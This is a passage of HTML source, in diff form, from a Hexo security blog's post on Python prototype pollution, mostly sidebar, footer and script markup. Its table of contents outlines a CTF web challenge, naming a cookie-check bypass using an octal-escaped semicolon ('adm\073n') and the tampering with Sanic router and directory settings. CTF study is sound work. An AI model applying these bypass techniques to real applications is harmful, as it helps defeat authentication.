class="toc-item toc-level-4"><a class="toc-link" href="#2024ciscn-sanic"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 2024ciscn sanic</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87cookie%E5%B0%86%E5%BD%93%E5%88%86%E5%89%B2%E7%AC%A6%E4%B9%9F%E5%8F%AF%E4%BB%A5adm073n"><span class="toc-number">1.4.1.1.</span> <span class="toc-text"> 绕过 cookie 将；当分割符，也可以 adm\073n</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9directory_view"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 修改 directory_view</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#printapproutername_indexkeys"><span class="toc-number">1.4.3.1.</span> <span class="toc-text"> print(app.router.name_index.keys())</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9directory%E7%9A%84%E5%80%BC"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 修改 directory 的值</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li class="active"><a href="/2025/05/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="bookmark" title="python原型链污染">python原型链污染</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">19</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">6</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">16</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2025/05/06/SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2025/05/21/SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/14/springboot-web/" title="springboot_web">springboot_web</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/ciscn2024/" title="In ciscn2024">ciscn2024</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/ciscn2024/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2025/05/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="python原型链污染">python原型链污染</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5/" title="[SWPU2019]我有一只马里奥">[SWPU2019]我有一只马里奥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/17/MyBatis/" title="MyBatis">MyBatis</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/MRCTF2020-ezmisc/" title="[MRCTF2020]ezmisc">[MRCTF2020]ezmisc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/04/28/3-txt/" title="buuctf4月27日">buuctf4月27日</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/06/17/ecshop%E5%A4%8D%E7%8E%B0/" title="ecshop复现">ecshop复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/GXYCTF2019-gakki/" title="[GXYCTF2019]gakki">[GXYCTF2019]gakki</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/05/21/sqltest/" title="sqltest">sqltest</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/21/SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE/" title="[SWPU2019]你有没有好好看网课?">[SWPU2019]你有没有好好看网课?</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2025/05/14/python原型链污染/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
